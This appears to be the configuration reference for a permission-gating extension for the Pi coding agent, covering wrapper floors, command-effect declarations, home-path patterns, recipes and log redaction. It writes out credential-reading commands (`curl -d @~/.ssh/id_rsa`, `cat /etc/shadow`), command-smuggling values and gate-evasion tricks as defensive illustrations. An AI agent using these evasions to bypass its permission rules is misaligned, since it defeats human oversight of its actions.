Each key is a command's **bare basename**, and each entry has up to three fields:

| Field          | Meaning                                                                                                                                          |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| `effects`      | `"read"`, `"write"`, or an array of them. `[]` says the command's arguments touch no file at all.                                                |
| `unlessOption` | Options that withdraw the declaration when they appear anywhere in the command, so its paths consult both surfaces again.                        |
| `subcommands`  | Entries for the word that follows, keyed by that exact word. A value is a nested entry or, as a shorthand, just its `effects` (`"log": "read"`). |

The rules are fail-closed wherever a rule had to choose:

- **Undeclared is unknown.**
  A command with no entry, a subcommand with no entry, and an entry with no `effects` all consult both surfaces.
- **Subcommands match exactly, as the next word.**
  `git -C ~/other log` and `git --no-pager log` are not `git log`: when an entry declares subcommands and the word in that position is an option or a computed word (`git $SUB`), the subcommand that will run cannot be told, so its paths consult both surfaces.
- **A path-qualified command is a different program.**
  `./git log` and `/usr/bin/git log` match no declaration.
- **An `unlessOption` stem withdraws the declaration, and never substitutes another.**
  It is matched the way the core's own withdrawing options are: a single letter after one dash (`-o`) anywhere in a cluster or with its value attached (`-so`, `-ofile`), a long option (`--output`) bare, with `=value`, or abbreviated (`--out`), and a longer single-dash option (`-exec`) as written or with a suffix (`-execdir`).
  A word whose value only the shell decides withdraws it too when it may arrive beginning with `-`.
  Stems met on the way down to a subcommand all apply to it, which is why the recipe guards `--output` on `git` itself: `git log`, `git show`, and `git diff` all accept `--output=<file>`, which writes it.
- **`["read", "write"]` consults both surfaces**, as an unproven path does; `"write"` alone consults only `_write`, which mostly makes a prompt more honest.

`effects: []` is for a tool whose arguments look like paths and are not.
`officecli set data.xlsx /Sheet1/B1` names a cell, but `/Sheet1/B1` is shaped exactly like `/etc/passwd`, and no rule can tell them apart.
Declaring `officecli` with no effects withdraws its arguments from `path` and `external_directory` entirely, so a `path` deny no longer reaches them either: that is the claim you are making about your own tool.
The `bash` surface still governs the command, including a `bash` rule written against the absolute spelling of one of its arguments.
It is the strongest claim the key can make, so make it only for a tool none of whose options reads or writes a file: `curl` looks like a candidate, but `curl -d @~/.ssh/id_rsa` reads the file it names and `curl -o` writes one.
A redirect on the command (`officecli … > ~/out.xlsx`) and a command nested inside it (`officecli $(cat ~/list)`) keep their own directions.

Three things a declaration cannot do:

- **Override the core.**
  The [pure-reader core](#the-pure-reader-command-core) answers first, including when one of its own guards withdraws a claim, so a declaration for `sed`, `sort`, `find`, or `cat` is never read.
  The extension warns about such an entry when it loads the config.
- **Reach through a wrapper.**
  A declaration describes a command's own arguments: `xargs git log ~/x` keeps the [indirection-wrapper floor](#declarations-and-privilege), and `~/x` consults both surfaces there.
  A wrapper's arguments carry the command it runs, so a declaration keyed by a wrapper itself (`xargs`, `sudo`, `env`, `time`, `timeout`, a shell, `eval`, and the rest of the floor's list) is never read either, and the extension warns about it when it loads the config.
  That list is the floor's, not every prefix command: a declaration for `command`, `exec`, `builtin`, `busybox`, or `ionice` is read like any other and describes the arguments that follow it, which are the command it runs, so do not declare one.
- **Come from an agent.**
  Only the global and project config files declare effects; agent frontmatter cannot, since an agent declaring its own tools read-only would be granting itself relief.

Declarations **shallow-merge by command** across global → project, as `shellTools` does: a project entry replaces a colliding command whole and never drops a global one.
An untrusted project's declarations are not loaded.
The review log records which file classified a path, as `effectSource: "declared-global"` or `"declared-project"`.

#### Wrapper transparency

The [indirection-wrapper floor](#fail-closed-behavior) exists because a wrapper hides the command that should be gated.
Three kinds of wrapper unit have no reason to be floored: one running a [pure reader](#a-wrapper-running-a-pure-reader), one that only [modifies how a command runs](#a-wrapper-that-only-modifies-execution), and one that [runs nothing](#a-wrapper-that-runs-nothing).
The first two resolve by the inner command's own `bash` rules, the third by its own, and the review log records which reason applied as `floorExemption`.

##### A wrapper running a pure reader

For this class the hiding is immaterial: a pure-reader command is read-only for **any** arguments, so `xargs grep -l foo` is provably a read even though what `xargs` feeds it is unknowable.
The floor guards unknowability of *scope*, and scope stays the path surfaces' job — for a wrapped command exactly as for a bare one.

Such a unit is therefore **not** floored.
It resolves by the inner command's own `bash` rules instead, and the review log records `floorExemption: "core-reader"` beside the rule that decided, so an allow the floor would once have prompted for is auditable to the reason that let it through.

All five of these must hold, and each is a way the floor's reason could still apply:

1. The unit is an indirection wrapper.
   An `sh -c`/`eval` payload is not one — see below.
2. The command it runs can be established without passing through an inline shell.
   `watch` and `parallel` hand their whole command line to a shell, and `rush` and `rust-parallel` build theirs from a template, so a unit with any of the four as a layer never qualifies: `watch cat x \; rm y` runs `rm`.
3. Every word the wrapper itself takes (an option, its value, an operand, a `NAME=value` word) is written literally.
   The shell splits or expands a computed word before the wrapper runs, so `sudo -u $U cat x` with `U="root rm y"` runs `rm y cat x`; quoting does not exempt it, since `"$@"` can vanish and a quoted variable can name an array.
   A computed word of the command it runs is fine: `sudo -u root cat $X` still qualifies.
4. That command **proves** a read: a bare-basename core word with no option that withdraws the claim.
   So `xargs sort -o /tmp/x` and `xargs find . -delete` stay floored, and so does `xargs ./grep foo`.
5. The enclosing statement provably writes no file through a redirect.
   A destination the parse cannot resolve — `> $OUT`, `> $(mktemp)` — counts against the exemption rather than for it.

So `xargs grep -l foo`, `xargs wc -l`, `xargs sed -n 1p`, `find . -name '*.ts' -exec cat {} +`, and the no-op probe `sudo -n true` stop prompting under a matching `bash` allow, while `xargs rm`, `xargs sed -i`, and `find . -exec sh -c '…' \;` still prompt.

Three things this does **not** change:

- An explicit `deny` or `ask` on the wrapper is never weakened.
  Only a unit whose own text already resolved to `allow` is affected, so `bash: {"xargs *": "ask"}` still asks.
- A `deny` on the inner command now reaches the wrapper.
  Under `bash: {"*": "allow", "grep *": "deny"}`, `xargs grep foo` is denied rather than merely prompted.
- Path gating is untouched.
  The exemption decides the `bash` surface only, and every path token the command projects still goes through `path` and `external_directory` with the direction its command proved.
  Clause 5 is what keeps that from being a weaker promise than it sounds: a redirect destination the parse cannot resolve (`> $OUT`, `> $(mktemp)`) is not projected onto those surfaces either, so the wrapper keeps its floor rather than relying on a gate that would not see the write.

##### A wrapper that only modifies execution

`time`, `timeout`, `nice`, `stdbuf`, and `setsid` change only *how* the same visible command runs: its timing, kill deadline, scheduling, buffering, or session.
Every operand is on the command line, and the wrapper adds no privilege, environment, or argument feed, so the floor's reason does not hold whatever the inner command does.
Such a unit resolves exactly as the command it runs, and the review log records `floorExemption: "execution-modifier"`.

All four of these must hold, and each keeps the decision about the command that really runs:

1. **Every** wrapper layer is one of the five.
   `time sudo rm -rf x` and `sudo time pnpm test` stay floored, as do `nohup` (it may write `nohup.out`) and `flock` (it creates its lock file).
2. Every option on each layer is one that wrapper is known to take, spelled in full, and every option, value, operand, and `NAME=value` word is written literally.
   A word the shell rewrites (`timeout $D …`, `timeout {5,sudo} …`) may become several, one of them a wrapper, so it keeps the floor.
   So `timeout --sig KILL 5 …` (an abbreviation) and `nice -5 …` stay floored, and so do `time`'s file-writing `-o`, `--output`, and `-a`.
   The admitted options are `time -p`/`-l`/`-h`/`-f`; `timeout -s`/`-k`/`-f`/`-p`/`-v` and their long forms; `nice -n`/`--adjustment`; and `stdbuf -i`/`-o`/`-e` and their long forms.
3. The command it runs is not itself a wrapper or an inline shell, so `timeout 5 bash -c '…'` stays floored.
4. The command it runs is named literally.
   `time ( … )` is decided by the commands inside it, each on its own rule, so `time (rm -rf /tmp/x)` reaches an `rm *` deny.
   `time { …; }` stays floored: the parser reads the group as `time`'s arguments, so the commands inside are not yet gated on their own rules.

So under `bash: {"*": "allow", "git push *": "deny"}`, `time pnpm run lint >/tmp/lint.txt 2>&1` is allowed and `timeout 60 git push --force` is denied, exactly as without the wrapper.
No redirect refusal applies here: the redirect destination goes through `path` and `external_directory` as it does for the bare command, and a destination the parse cannot resolve (`> $OUT`) is unprojected for both forms alike.
When a unit qualifies for both exemptions (`time grep foo`), the review log records `core-reader`.

##### A wrapper that runs nothing

Given no command, `env` prints the environment and runs nothing, exactly as `printenv` does.
There is no command for it to hide, so such a unit resolves by its own `bash` rule (`env …`, or the fallback), and the review log records `floorExemption: "no-command"`.
So under `bash: {"*": "allow"}`, `env | rg '^PI_'`, `env -i`, `env -u FOO`, and `env FOO=1` are allowed.

All three of these must hold, and each is a way a command could still run:

1. The unit is `env` itself, not `env` behind another wrapper: `sudo env` and `time env` stay floored.
   No other wrapper qualifies, since bare `xargs` runs `echo` and `sudo` and `doas` are not audited for their bare forms.
2. Every word after `env` is an option `env` is known to take, that option's value, `--` or a lone `-`, or a `NAME=value` assignment after the options.
   A [refused mode](#declarations-and-privilege) keeps the floor even with no command (`env -C /tmp`, `env -S 'rm x'`), and so does a quoted assignment (`env 'FOO=1'`), which reads as a command.
   So does `env --unset FOO`: BSD `env` (the macOS one) has no long options and reads it as `-u nset`, then runs `FOO`; `env --unset=FOO` and `env -u FOO` qualify.
3. Every one of those words is written literally.
   `env -u $X` with `X="FOO rm"` runs `rm`, and `env $X` may name any command.

No redirect refusal applies: `env > /tmp/x` is decided as `printenv > /tmp/x` is, with the destination gated by `path` and `external_directory`.

If you want a bare `env` to prompt because it prints every secret in the environment, say so in the policy: `"env *": "ask"` and `"printenv *": "ask"` match the bare commands and every form with options, and a rule on the wrapper's own text is decided before the exemption is consulted.
That rule also asks for every `env` that does run a command (`env cat x`), which is usually what such a policy wants.

##### Declarations and privilege

Neither exemption is extended by configuration.
A [`commandEffects` declaration](#declaring-your-own-commands-commandeffects) participates in effect classification but does **not** lift the floor.
The core's argument-independence is audited here; a claim about a wrapped command is not, and a wrong claim behind a wrapper fails open.

`sudo` and `doas` are ordinary wrappers to the pure-reader rule, and never execution modifiers.
The path surfaces gate `sudo cat /etc/shadow` exactly as they gate `cat /etc/shadow`, so nothing about the *file set* changes — what `sudo` adds is that the operating system would have refused, which this extension has never modelled.
If you run a permissive `bash` policy and want privilege elevation to prompt regardless, say so directly:

```jsonc
{
  "permission": {
    "bash": {
      "*": "allow",
      "sudo *": "ask",
      "doas *": "ask"
    }
  }
}
```

That rule matches the wrapper's own text, so it is decided before the exemption is ever consulted.

`sudo`'s own options are read the way `sudo` reads them, so `sudo -nu cat rm x` runs `rm x`, not a pure reader named `cat`.
A `sudo` mode in which the command it names is not what runs as named keeps the floor whatever that command is: `-e`/`--edit` (sudoedit edits its operands as files, as root), `-s`/`--shell` and `-i`/`--login` (a shell runs the operand), and `-D`/`--chdir` and `-R`/`--chroot` (relative operands resolve somewhere the path surfaces do not look).
So does `-h`, whose meaning depends on what follows it, and any option `sudo`'s manual does not list; a mode that keeps the floor is approved at the prompt or under `yoloMode`.

`env`, `xargs`, and `doas` are read the same way, from the BSD and GNU manuals for the first two and `opendoas` for the third, and any option those do not list keeps the floor too.
So `xargs -n 1 cat` and `env -u FOO cat x` still resolve by `cat`'s rule, while these keep the floor whatever command they name:

- `env -C`/`--chdir`, because relative operands resolve somewhere the path surfaces do not look (`env -C /etc cat shadow` reads `/etc/shadow`).
- `env -S`/`--split-string`, because the command is split out of one word at run time (`env -Srm cat` runs `rm cat`).
- `env -P`, `-a`/`--argv0`, and `--env0-from`, because each chooses which binary the named command is: a search path, the argv0 a multi-call binary dispatches on, or an environment that may set `PATH`.
- `env --unset` with its value as a separate word, because BSD `env` reads `--unset FOO cat x` as `-u nset` and runs `FOO`, while GNU `env` unsets `FOO` and runs `cat`; `--unset=FOO` and `-u FOO` are read the same by both.
- `xargs -J`, because it puts input in the command's place when the command equals its replacement string.
- `doas -C` (it checks a config and runs nothing), `doas -s` (it runs a shell), and OpenBSD's `doas -a`, which `opendoas` does not list.

GNU `xargs -i`, `-l`, `-e`, and `--max-lines` take a value only when it is attached (`-i{}`, `--max-lines=2`), so `xargs -i rm cat x` runs `rm`, and `xargs` and `doas` run a `NAME=value` word as the command rather than an assignment.

#### Which key to actually write

The useful *grants* are `*_read: allow` and the bare sugar key.

```jsonc
{
  "permission": {
    "external_directory": { "*": "ask" },
    "external_directory_read": { "~/dev/*": "allow" }
  }
}
```

A `read` of `~/dev/x` is silent; a `write` or `edit` of the same path still prompts.
Granting an external root takes one line in one surface — no parallel `path_read` entry is needed, because the `path` family only speaks when one of its own patterns matches.

`*_write` earns its keep as a **restriction** far more than as a grant.
`path_write: { "*": "deny" }` is a coherent read-only-agent posture.

A `*_write: allow` on its own does not silence an `edit`, which also reads — grant the read direction too, or use the bare key.

A key that looks directional but is misspelled (`path_wrote`, `external_directory_reed`) is rejected when the config loads, rather than sitting inert.
That matters most for a restriction: a misspelled *grant* merely produces more prompts, but a misspelled *deny* would enforce nothing at all.

#### What you will see change

Prompts, the review log, and the `permissions:decision` event now name the directional surface that decided — `path_read` rather than `path` — when the tool's identity proved a direction.
`/permission-system show` likewise lists the expanded directional rules for a config written with a bare key, so the display matches what is enforced.

One cross-version note for subagent permission forwarding: a child running a newer version sends a directional surface to a parent running an older one, which has no such rules and falls back to its default — more prompting, never less.
Upgrade the parent session to match.

### Home Directory Expansion in Patterns

Pattern keys in any permission surface can start with `~/`, `$HOME/`, or `${HOME}/` (or be exactly `~`, `$HOME`, or `${HOME}`).
They are expanded to the OS home directory at match time, so configs are portable across machines and users.
A prefix is recognized only when it stands alone or precedes a separator, so a longer name (`~username`, `$HOMEDIR`) and a braced expansion carrying an operator (`${HOME:-/tmp}`) are left alone.

```jsonc
{
  "permission": {
    "external_directory": {
      "*": "ask",
      "~/development/*": "allow"
    }
  }
}
```

The pattern is stored and displayed as written (e.g. `~/development/*`) in logs and approval dialogs.

Path **values** supplied by bash commands and extension tools are expanded the same way.
This means `~/...`, `$HOME/...`, `${HOME}/...`, and the fully-expanded absolute form all match a single home-anchored pattern: `cat ~/.ssh/config`, `cat $HOME/.ssh/config`, or `cat /Users/me/.ssh/config` is caught by a `"~/.ssh/*": "deny"` rule.
Pi's built-in file tools expand only `~`, as Pi itself does: a `read` of `~/.ssh/config` or `/Users/me/.ssh/config` is caught, while a `read` of `$HOME/.ssh/config` opens `<cwd>/$HOME/.ssh/config` and is matched as that file.

A `bash` command that **starts** with a home prefix matches a home-anchored command pattern the same way.
With `"~/bin/tool *": "deny"`, the commands `~/bin/tool --now`, `$HOME/bin/tool --now`, `${HOME}/bin/tool --now`, and `/Users/me/bin/tool --now` are all denied, and an allow written with `~` covers each of those spellings too.
The command is still shown, logged, and offered for session approval as typed.
Three limits apply:

- On Windows, a home-anchored `bash` pattern is compiled with backslash separators, so it matches only a command typed with the backslashed absolute path ([issue #1020](https://github.com/gotgenes/pi-packages/issues/1020)).
- A command that reassigns `HOME` earlier in the same invocation (`HOME=/tmp/x; ~/bin/tool`, or a `HOME=/tmp/x` prefix) is matched only as typed, because its `~` no longer names your home directory.
  A reassignment the parser cannot see, such as one through a variable holding the name (`n=HOME; read $n`), is not detected, so the command still matches your home-anchored rules.
  Writing a command that way takes deliberate effort to evade a rule; run an agent you would not trust with that inside a sandbox rather than relying on command patterns.
- A home prefix later in the command, in argument position, is matched as typed: a pattern `cat ~/notes` matches the command `cat ~/notes` but not `cat /Users/me/notes`.
  Gate file access by any spelling on the `path` and `external_directory` surfaces instead.

The `bash` surface matches text, so a `*` in a home-anchored pattern also matches `..`: `~/bin/*` allows `~/bin/../../tmp/x`, exactly as it allows `/Users/me/bin/../../tmp/x`.
Anchor an allow on the full command (`~/bin/tool *`) rather than a directory wildcard when that matters.

---

## Per-Agent Overrides

Override global permissions for specific agents via YAML frontmatter in Pi agent definition files.

### Global Agent Override

Path: `~/.pi/agent/agents/<agent>.md` (respects `PI_CODING_AGENT_DIR`)

```yaml
---
name: my-agent
permission:
  read: allow
  write: deny
  mcp: allow
  bash:
    git *: ask
    git status: allow
  mcp:
    chrome_devtools_*: deny
    exa_*: allow
  skill:
    "*": ask
---
```

### Project Agent Override

Path: `<cwd>/.pi/agents/<agent>.md`

Project agent files are resolved from Pi's current session `cwd`, so they are workspace-specific and do **not** move under `PI_CODING_AGENT_DIR`.

### Frontmatter Limitations

The frontmatter parser is intentionally minimal.
Use only `key: value` scalars and nested maps.
Avoid arrays, multi-line scalars, and YAML anchors.

---

## Common Recipes

### Protect Sensitive Files

```jsonc
{
  "permission": {
    "*": "ask",
    "read": {
      "*": "allow",
      "*.env": "deny",
      "*.env.*": "deny",
      "*.env.example": "allow"
    },
    "write": {
      "*": "ask",
      "*.lock": "deny"
    }
  }
}
```

### Read-Only Mode

```jsonc
{
  "permission": {
    "*": "ask",
    "read": "allow",
    "grep": "allow",
    "find": "allow",
    "ls": "allow",
    "write": "deny",
    "edit": "deny"
  }
}
```

### Restricted Bash Surface

```jsonc
{
  "permission": {
    "*": "ask",
    "bash": {
      "*": "deny",
      "git status": "allow",
      "git diff": "allow",
      "git log *": "allow"
    }
  }
}
```

The Bash tool stays visible to the agent here: the three `git` patterns are written after the `deny` catch-all, so they are reachable.
Every other command is denied at the gate.

### Read-Only Bash Command Allowlist

The [Read-Only Mode](#read-only-mode) recipe above gates *tools*; this one gates the *bash* surface.
It allows a curated set of commands whose only effect is to read or report — none can create or modify a file, register, or system state by itself — while every other command falls through to `ask`.

```jsonc
{
  "permission": {
    "*": "ask",
    "write": "deny",
    "edit": "deny",
    "path": {
      "*": "allow",
      "*.env": "deny",
      "*.env.*": "deny",
      "~/.ssh/*": "deny"
    },
    "bash": {
      "*": "ask",

      // File inspection
      "cat *": "allow",
      "head *": "allow",
      "tail *": "allow",
      "less *": "allow",
      "more *": "allow",

      // Listing and metadata
      "ls *": "allow",
      "tree *": "allow",
      "stat *": "allow",
      "file *": "allow",
      "wc *": "allow",
      "du *": "allow",
      "df *": "allow",

      // Search (find/fd with -exec are auto-floored to ask)
      "grep *": "allow",
      "egrep *": "allow",
      "fgrep *": "allow",
      "rg *": "allow",
      "find *": "allow",
      "fd *": "allow",

      // Comparison and hashing
      "diff *": "allow",
      "cmp *": "allow",
      "comm *": "allow",
      "md5sum *": "allow",
      "sha1sum *": "allow",
      "sha256sum *": "allow",
      "cksum *": "allow",

      // System info
      "pwd": "allow",
      "whoami": "allow",
      "id": "allow",
      "hostname": "allow",
      "uname *": "allow",
      "date": "allow",
      "uptime": "allow",
      "ps *": "allow",
      "printenv *": "allow",
      "which *": "allow",
      "type *": "allow",

      // Git read-only subcommands (never a broad "git *")
      "git status": "allow",
      "git diff *": "allow",
      "git log *": "allow",
      "git show *": "allow",
      "git blame *": "allow",
      "git ls-files *": "allow",
      "git branch": "allow",
      "git remote -v": "allow"
    }
  }
}
```

Four existing behaviors keep this allowlist safe — you do not have to enumerate the destructive commands to block them:

1. **Redirects are gated by the `path` surface, not `bash`.**
   Allowing `cat *` allows the `cat` command, not a redirect it carries: `cat secret > out.txt` writes `out.txt` through the `path`/`external_directory` gate.
   That is why this recipe ships with `write` and `edit` denied and a `path` deny block for sensitive files.
   Keep the `path` surface locked down for anything you would not want an allowed read command to overwrite via `>`.
2. **`find`/`fd` with an exec flag are floored to `ask`.**
   A bare `find *` search is read-only, so it is safe to allow; the moment an exec flag appears (`find -exec`/`-execdir`/`-ok`/`-okdir`, `fd -x`/`-X`), the [indirection-wrapper floor](#fail-closed-behavior) clamps the decision back to `ask` — unless the command it runs is itself a pure reader ([wrapper transparency](#wrapper-transparency)), in which case that command's own rule decides.
   So `find . -type f -exec rm {} +` still prompts even under `find *: allow`, while `find . -type f -exec cat {} +` is decided by the `cat *` rule this recipe already grants.
   The same options — plus `find -delete`/`-fprint`/`-fprint0`/`-fprintf`/`-fls` and `fd --exec`/`--exec-batch` — also withdraw the [pure-reader claim](#the-pure-reader-command-core) on that command's path tokens, so they stop resolving on the `_read` surface alone.
3. **Chained commands resolve most-restrictive.**
   `find . -name '*.log' && rm -f found.log` decomposes into `find …` and `rm …`; `rm` matches only `"*": "ask"`, and the most restrictive result governs the whole invocation, so the chain prompts.
4. **Wrappers cannot ride the allowlist.**
   `sudo aws …`, `env X=1 npm …`, `sh -c "…"`, and `eval "…"` are floored to `ask` (the [wrapper floors](#fail-closed-behavior)), so a command this recipe does not allow cannot be smuggled past through a wrapper.
   The wrapper text is what a rule matches, so `sudo grep foo` matches only `"*": "ask"` here and prompts on that rule rather than on the floor — add `"sudo *": "ask"` if you want that stated in the config rather than inherited from the fallback.

`git` is enumerated by read subcommand rather than a broad `git *`, because `git` has mutating subcommands (`commit`, `push`, `branch -D`, `remote add`, `config <key> <value>`).
Exact patterns like `git status` and `git branch` match only their literal form, so `git branch -D feature` falls through to `"*": "ask"`.
The `*`-suffixed git patterns (`git diff *`, `git log *`) are safe because those subcommands are read-only regardless of their arguments.

Commands that can originate a write are deliberately omitted: `echo` and `printf` are the usual content source for a `>` redirect, `tee` writes its input to a file, and `sort -o`, `sed -i`, and in-place `awk` redirects modify files directly.
Add them only if you understand that pairing them with `write: deny` and a strict `path` surface is what keeps them from writing.

### MCP Discovery Only

```jsonc
{
  "permission": {
    "*": "ask",
    "mcp": {
      "*": "ask",
      "mcp_status": "allow",
      "mcp_list": "allow",
      "mcp_search": "allow",
      "mcp_describe": "allow"
    }
  }
}
```

### Per-Agent Lockdown

In the global Pi agents directory (default: `~/.pi/agent/agents/reviewer.md`, respects `PI_CODING_AGENT_DIR`):

```yaml
---
permission:
  write: deny
  edit: deny
  bash: deny
---
```

---

## Pi Integration Hooks

The extension integrates via Pi's lifecycle hooks:

| Hook                 | Behavior                                                                                                                                                                                |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `before_agent_start` | Filters the active tool set (restrict-only), states a subagent child's own tool list and rules, and hides denied skills, all through pi's prompt options rather than a rewritten prompt |
| `tool_call`          | Enforces permissions for every tool invocation                                                                                                                                          |
| `input`              | Intercepts `/skill:<name>` requests and enforces skill policy                                                                                                                           |

Additional behaviors:

- Unknown/unregistered tools are blocked before permission checks (prevents bypass attempts)
- Tool filtering is restrict-only: the active set starts from pi's already-active tools (`pi.getActiveTools()`) and only ever has denied tools removed — the permission system never activates a tool pi left off by default (e.g. `find`, `grep`, `ls`)
- Policy is applied to the tool surface pi has activated over the session, not to the previous turn's filtered result, so removing a `deny` rule restores the tool it had hidden without restarting pi.
  A tool that stops being active for any other reason (another extension deactivating it, pi unregistering it) is not restored.
- A tool is removed only when every value under its surface resolves to `deny`; a surface with any reachable `allow` or `ask` pattern stays available (see [Tool Surfaces](#tool-surfaces))
- Every change this extension makes to the system prompt goes through pi's `systemPromptOptions`; it never returns a rewritten prompt.
  A returned prompt is sent as the whole prompt, which would drop the sections other extensions add after this one runs, such as pi's `<mcp_servers>` list of `codemode` and `deferred` MCP servers (see [ADR 0015](decisions/0015-prompt-changes-through-system-prompt-options.md)).
- On pi's default prompt, the tool list and guidelines stay where pi writes them, as its `<tools>` and `<rules>` sections, and pi renders them from the filtered active set, so a denied tool and its guidelines are absent and a restored tool is listed on the turn it returns.
- A custom system prompt (`.pi/SYSTEM.md`, `~/.pi/agent/SYSTEM.md`, `--system-prompt`) is left exactly as pi built it: pi writes no tool list or rules under one, and this extension adds none either, so the prompt describes tools only if you wrote that yourself.
  Tool filtering and enforcement still apply, and the model still receives only the allowed tools in the request's tool list.
  A subagent child is the exception: its prompt is always a custom one assembled by the subagent extension, so it gets its own `<tools>` and `<rules>` sections, placed after the working directory, while any custom text it inherited stays untouched.
  The child's sections follow pi's own rules: a tool is listed only when pi supplied a one-line description for it, and the guideline bullets are the allowed tools' own contributions, then any rules another extension added to `systemPromptOptions.promptGuidelines`, around pi's built-in ones.
- A subagent child running with `@gotgenes/pi-subagents` needs a release that drops the parent's `<tools>` and `<rules>` from the prompt the child inherits; with an older one, the child shows the parent's tool list as well as its own.
- A denied skill is removed from the skills catalogue pi renders.
  A skill listed in text pi did not render, such as your own `SYSTEM.md`, is not edited out; using it is still gated.
- The prompt options are recomputed on every turn but are stable across turns for a stable policy/agent, so the provider's prompt cache is preserved rather than rewritten each turn.
  A policy change is an intentional cache transition, as a mid-session agent switch already is.
- Extension-provided tools like `task`, `mcp`, and third-party tools are handled by exact registered name; Pi's built-in MCP tools (`mcp__<server>__<tool>`) resolve on the `mcp` surface instead (see [Pi's built-in MCP tools](#pis-built-in-mcp-tools))
- Generic extension-tool approval prompts include a bounded input preview; built-in file tools use concise human-readable summaries
- Permission review logs include `toolInputPreview` values for tool calls other than bash and the `mcp` proxy, with sensitive-keyed values masked and every value bounded by `reviewLogFieldMaxWidth` (see [Log file sensitivity](#log-file-sensitivity))
- A tool whose path came from an extractor registered in an **ancestor** session rather than this one records `extractorSource: "inherited"` beside the decision; the field is absent for every path this session resolved itself.
  This happens in a subagent child when the extractor's provider was kept out of the child but the tool's own package was not — the child borrows the declaration so its `path` and `external_directory` gates still see the path (see [Subagent Integration](https://github.com/gotgenes/pi-packages/blob/main/packages/pi-permission-system/docs/subagent-integration.md#loading-asymmetry))

---

## Log file sensitivity

The review log is enabled by default and records what the agent actually did, which means it records payload as well as decisions: the bash command string for every bash decision, and a JSON preview of the tool input for other tools.
The debug log carries the same payload when `debugLog` is on.

Three protections apply.

Both logs are created **owner-only** (`0600`, in a `0700` directory), and a log created by an earlier version is tightened on the next write.
The permission-forwarding request and response files are written the same way.
This closes the shared-host case: another user on the same machine cannot read them.

Values bound to a **sensitive name** — `authorization`, `token`, `secret`, `password`, `credential`, `cookie`, and a bare or suffixed `key` (`api_key`, `private_key`, `OPENROUTER_KEY`, `apiKey`), matched case-insensitively — are masked as `[redacted]` before anything is written.
So a tool called with `{"authorization": "Bearer …"}` records `{"authorization": "[redacted]"}`.

A bash command binds values to names too, and the same predicate answers for those.
The command is parsed, and a value is masked when it is bound to a sensitive name by a shell assignment or a request header field:

```text
KEY="sk-or-v1-…" curl https://x        →  KEY=[redacted] curl https://x
env MY_KEY=… deploy                    →  env MY_KEY=[redacted] deploy
curl -H "Authorization: Bearer sk-…"   →  curl -H "Authorization:[redacted]"
bash -c 'TOKEN=sk-… deploy'            →  bash -c 'TOKEN=[redacted] deploy'
```

The boundary is worth stating exactly, because it is easy to over-read:

> A value bound to a sensitive name is masked — whether the name is a log key, a shell variable, or a request header field.
> A secret with no name bound to it, such as one typed as a `grep` pattern, is not.

So `grep -r "sk-ant-…" .` and `deploy --token abc123` are both logged unredacted: the first binds the secret to nothing, and the second binds it to a flag rather than a name.
The extension deliberately does not try to guess which parts of a command look secret-shaped — see [ADR 0010] for the measured reasoning.
A command the parser could not fully resolve is masked only as far as the parse reached.
A secret inside a **heredoc body** (`cat > .env <<'EOF'` / `API_KEY=…` / `EOF`) is not masked at all: a heredoc body is literal data rather than shell, and re-parsing one as shell is how the log's own Python and TypeScript heredocs come to read as assignments — measured at six false positives and no true ones, so [ADR 0010] declines it.
An **inline-shell payload** (`bash -c '…'`, `sh -c "…"`, `eval '…'`) *is* masked, because the package already knows that argument is shell — including one reached through a wrapper (`sudo bash -c '…'`, `xargs -I{} sh -c '…'`).
An interpreter's payload (`python3 -c '…'`) is not, for the same reason a heredoc body is not.
Where a payload is stitched together across quote boundaries (`bash -c 'TOKEN='"$SECRET"`), the whole argument is replaced rather than just the value, because no single offset maps the value back onto the command:

```text
bash -c 'TOKEN='"$SECRET"               →  bash -c [redacted]
```

Every value the **review** log writes is narrowed to `reviewLogFieldMaxWidth` (1000 characters by default) and marked with an ellipsis, so a single pathological command cannot put tens of kilobytes in one entry.
This is a length bound, not redaction: it never inspects a value to decide what to hide, and it applies to every field alike.
The two compose, and masking runs first — a sensitively-named value is masked whole however long it was, and the cap never shortens one.
The debug log is left unbounded, since it is opt-in and exists to be read in full.

Practical guidance:

- Treat both log files as sensitive when sharing them: scrub before pasting into an issue or a chat.
- Set `"permissionReviewLog": false` (and leave `debugLog` off) for a session that will handle credentials on the command line.
- Owner-only modes do not protect against anything running as you, including a backup or cloud-sync agent that copies your home directory.

[ADR 0010]: https://github.com/gotgenes/pi-packages/blob/main/packages/pi-permission-system/docs/decisions/0010-permission-log-secret-exposure.md

---

## Schema Validation

Validate your config against the included schema:

```bash
npx --yes ajv-cli@5 validate \
  -s ./schemas/permissions.schema.json \
  -d ./config.json
```

**Editor tip:** Add the hosted schema URL as the `$schema` key in your config for autocomplete and validation support:

```json
"$schema": "https://raw.githubusercontent.com/gotgenes/pi-packages/main/packages/pi-permission-system/schemas/permissions.schema.json"
```

The well-known surface keys — `*`, `path`, `external_directory`, `bash`, `mcp`, `skill`, and the four directional keys — are named properties in the schema, so an editor completes them and shows each key's own documentation on hover; any other registered tool name still validates as a surface.

The schema is generated from the extension's zod source of truth (`src/config/config-schema.ts`); regenerate it with `pnpm run gen:schema` after changing the config shape.
